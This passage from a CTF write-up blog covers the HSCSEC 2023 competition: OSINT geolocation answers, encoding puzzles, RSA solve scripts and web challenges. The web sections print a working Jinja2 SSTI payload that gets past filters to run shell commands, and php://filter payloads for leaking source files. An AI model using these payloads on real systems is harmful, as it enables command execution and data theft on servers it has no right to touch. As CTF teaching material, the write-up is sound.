class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">n = gcd([c2**<span class="number">2</span>-c4, c2*c3-c6, c2*c6-c3*c4])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> n%i==<span class="number">0</span>:</span><br><span class="line">        n //= i</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># assert m.bit_length() == 47</span></span><br><span class="line">m = discrete_log_lambda(Mod(c2,n), Mod(<span class="number">2</span>, n), bounds=(<span class="number">2</span>^<span class="number">46</span>, <span class="number">2</span>^<span class="number">47</span>))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + long_to_bytes(<span class="built_in">int</span>(m)) + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F/" rel="tag">黄河流域</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-HSCSEC-红客突击队-2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/"
    >HSCSEC-红客突击队-2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/" class="article-date">
  <time datetime="2023-02-13T06:32:52.000Z" itemprop="datePublished">2023-02-13</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</span><br><span class="line"></span><br><span class="line">本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。</span><br><span class="line"></span><br><span class="line">Rank: 31</span><br></pre></td></tr></table></figure>



<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h2><p>百度搜索阿勒泰市第十三届元宵灯会</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112151940.png" alt="image-20230211112151940"></p>
<p>在阿勒泰市五百里风情街举办</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112308268.png" alt="image-20230211112308268"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211113109127.png" alt="image-20230211113109127"></p>
<p>所以HSCSEC{新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街}</p>
<h2 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/boat.png" alt="boat"></p>
<p>通过百度搜索得到这是在西湖拍的照片</p>
<p>然后搜索西湖的具体位置</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211114001758.png" alt="image-20230211204617988"></p>
<p>HSCSEC{浙江省杭州市西湖区龙井路1号}</p>
<h2 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h2><p>通过百度识图得</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112221530.png" alt="image-20230212112221530"></p>
<p>然后搜索西单大悦城</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112321745.png" alt="image-20230212112321745"></p>
<p>HSCSEC{北京市西城区西单北大街131号}</p>
<h2 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112540058.png" alt="image-20230212112540058"></p>
<p>可以隐约看到风机型号应该是B-30EL百度</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113106096.png" alt="image-20230212113106096"></p>
<p>发现是渝兴线上的   重庆到北京大兴机场的</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113226575.png" alt="image-20230212113226575"></p>
<p>与飞机的俯瞰图有相同的地方</p>
<p>HSCSEC{北京市大兴区大兴国际机场}</p>
<h2 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113717456.png" alt="image-20230212113717456"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113801024.png" alt="image-20230212113801024"></p>
<p>河北省张家口市怀来县的官厅水库国家湿地公园</p>
<p>HSCSEC{河北省张家口市怀来县官厅水库国家湿地公园}</p>
<h2 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/Tower.jpg" alt="Tower"></p>
<p>通过百度识图得这是澳门巴黎塔</p>
<p>然后高德搜索具体位置</p>
<p>HSCSEC{澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人}</p>
<h2 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142744556.png" alt="image-20230213142744556"></p>
<p>可以看到宁夏理工学院百度搜宁夏理工学院的湖的具体位置</p>
<p>HSCSEC{宁夏回族自治区石嘴山市大武口区星海湖}</p>
<h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h2 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这应该是八卦图和一个空字组成的一种进制数  因为一共有九个符号所以应该是九进制的数</span></span><br><span class="line"><span class="comment">#☲☵这两个符号应该是H的ASCII码的值72，又因为九进制的80等于十进制的72，所以☲:8,☵:0</span></span><br><span class="line"><span class="comment">#☷☵☳这三个符号应该是S的ASCII码值83,又因为九进制的102等于十进制的83，所以☷:1,☳:2</span></span><br><span class="line"><span class="comment">#☶空这两个符号应该是C的ASCII码值67，又因为九进制的74等于十进制的67，所以☶:7,空:4</span></span><br><span class="line"><span class="comment">#☷空☱这三个符号应该是&#123;的ASCII码值123，又因为九进制的146等于十进制的123，所以☱:6</span></span><br><span class="line"><span class="comment">#还剩3和5 ☰ ☴ 要么 ☴:3 要么☴:5</span></span><br><span class="line">c=<span class="string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="string">&#x27;☵&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;☷&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;☳&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;☴&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;空&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;☰&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;☱&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;☶&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;☲&#x27;</span>:<span class="string">&#x27;8&#x27;</span>&#125;      <span class="comment">#正确的</span></span><br><span class="line"><span class="comment"># dict=&#123;&#x27;☵&#x27;:&#x27;0&#x27;,&#x27;☷&#x27;:&#x27;1&#x27;,&#x27;☳&#x27;:&#x27;2&#x27;,&#x27;☰&#x27;:&#x27;3&#x27;,&#x27;空&#x27;:&#x27;4&#x27;,&#x27;☴&#x27;:&#x27;5&#x27;,&#x27;☱&#x27;:&#x27;6&#x27;,&#x27;☶&#x27;:&#x27;7&#x27;,&#x27;☲&#x27;:&#x27;8&#x27;&#125;    #错误的</span></span><br><span class="line">c0=c.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        m += <span class="built_in">dict</span>.get(j)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(m,<span class="number">9</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;Chinese_g0ssp&#125;  发现少个i手动加上   HSCSEC&#123;Chinese_g0ssip&#125;</span></span><br></pre></td></tr></table></figure>





<h2 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h2><p>通过搜索得到二十八星宿，又分为青龙，白虎，朱雀，玄武四大类每一类可以看成相同的一个数字</p>
<p>则这四类可以组成一个四进制的数字</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211220246475.png" alt="image-20230211220246475"></p>
<p>要把   壁水獝  改为   壁水貐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">qinglong=<span class="string">&#x27;角木蛟 亢金龙 氐土貉 房日兔 心月狐 尾火虎 箕水豹&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">zuque=<span class="string">&#x27;井木犴 鬼金羊 柳土獐 星日马 张月鹿 翼火蛇 轸水蚓&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">xuanwu=<span class="string">&#x27;斗木獬 牛金牛 女土蝠 虚日鼠 危月燕 室火猪 壁水貐&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">baihu=<span class="string">&#x27;奎木狼 娄金狗 胃土雉 昴日鸡 毕月乌 觜火猴 参水猿&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c=<span class="string">&#x27;&#x27;&#x27;斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴</span></span><br><span class="line"><span class="string">虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐</span></span><br><span class="line"><span class="string">壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马</span></span><br><span class="line"><span class="string">虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓</span></span><br><span class="line"><span class="string">室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐</span></span><br><span class="line"><span class="string">牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌</span></span><br><span class="line"><span class="string">危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐</span></span><br><span class="line"><span class="string">斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡</span></span><br><span class="line"><span class="string">危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴</span></span><br><span class="line"><span class="string">牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎</span></span><br><span class="line"><span class="string">室火猪鬼金羊柳土獐壁水貐&#x27;&#x27;&#x27;</span></span><br><span class="line">c0=c.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m.append(i[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> m:     <span class="comment">#这里不知道谁代表0，1，2，3 利用枚举尝试看那种组合可以得到正确结果</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> qinglong:</span><br><span class="line">            flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> zuque:</span><br><span class="line">            flag+=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> xuanwu:</span><br><span class="line">            flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> baihu:</span><br><span class="line">            flag+=<span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag,<span class="number">4</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># import gmpy2</span></span><br><span class="line"><span class="comment"># from flag import m</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># print(&#x27;n =&#x27;,n)</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># M = m * e * 1 * 2022 * p</span></span><br><span class="line"><span class="comment"># c = pow(M,e,n)</span></span><br><span class="line"><span class="comment"># print(&#x27;c =&#x27;,c)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=<span class="number">97772803605372749682605407399511947369112121674469942228369880617973442071629696563167801242512592723590571045910500244994517647412843880814748689241502769894657207751011999959509916975918486841422622984629059948050450554202252225537996289481828075394484142212703142883528182761865502541887744555480640923169</span></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m//<span class="number">2022</span>//e//p)))</span><br><span class="line"><span class="comment">#flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #!/bin/python3</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import bytes_to_long, getPrime</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># FLAG = &quot;*******************MASK****************&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # print(FLAG)</span></span><br><span class="line"><span class="comment"># number1 = getPrime(512)</span></span><br><span class="line"><span class="comment"># number2 = getPrime(1024)</span></span><br><span class="line"><span class="comment"># print(number1)</span></span><br><span class="line"><span class="comment"># result = FLAG * number1 % number2</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">number1=<span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">result=<span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line">m=result//number1</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;qMmZqWvmj70bBsCfmVLT&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># alphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line"><span class="comment"># key = &#x27;HSC&#x27;</span></span><br><span class="line"><span class="comment"># assert flag.startswith(&#x27;HSCSEC&#123;&#x27;)</span></span><br><span class="line"><span class="comment"># flag_num_list = []</span></span><br><span class="line"><span class="comment"># c = []</span></span><br><span class="line"><span class="comment"># for item in flag:</span></span><br><span class="line"><span class="comment">#     flag_num_list.append(alphabet.find(item) + 1)</span></span><br><span class="line"><span class="comment"># key_num = alphabet.find(key) + 1</span></span><br><span class="line"><span class="comment"># for i in flag_num_list:</span></span><br><span class="line"><span class="comment">#     m = (i + key_num) % 94 - 1</span></span><br><span class="line"><span class="comment">#     if m == 0:</span></span><br><span class="line"><span class="comment">#         c.append(&quot;□&quot;)</span></span><br><span class="line"><span class="comment">#     c.append(alphabet[m-1:m])</span></span><br><span class="line"><span class="comment"># print(&quot;c = &#123;&#125;&quot;.format(&#x27;&#x27;.join(c)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(key_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    m=alphabet.find(i) + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(alphabet[m],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132309050.png" alt="image-20230212132309050"></p>
<p>进行到这一步的时候发现页面中显示  说明把popen和flag给过滤了</p>
<p>popen可以利用字符拼接绕过  flag可以通过 sort  fl*实现绕过</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132617954.png" alt="image-20230212132617954"></p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;pop&quot;&quot;en&quot;](&#x27;sort /fl*&#x27;).read()&#125;&#125;                             </span><br></pre></td></tr></table></figure>

<p>HSCSEC{9a288ab6-fd07-48e9-981c-9badd98ae5a9}</p>
<p>或者tplmap</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142355361.png" alt="image-20230213142355361"></p>
<h2 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h2><p>赛后看了大佬WP才看懂</p>
<p>首先就是利用php伪协议和base大小写绕过来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=upload.php</span><br><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=view.php</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span> = <span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span> = <span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span> = <span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span> = <span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span 